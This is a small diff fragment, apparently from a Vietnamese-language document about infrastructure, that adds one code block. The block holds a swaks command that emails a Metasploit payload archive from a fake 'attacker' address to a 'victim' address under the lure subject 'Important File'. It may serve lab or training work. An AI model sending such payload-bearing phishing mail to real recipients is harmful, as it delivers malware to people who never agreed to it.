@@ -65,3 +65,7 @@ Mục tiêu: hiểu “cấu trúc” và “ai/ở đâu” vận hành hạ t�
 
 
 ```
+```
+swaks --to victim@target.com --from attacker@fake.com --server localhost:25 --attach ~/.msf4/local/payload.tar --body "Test attachment" --header "Subject: Important File"
+
+```
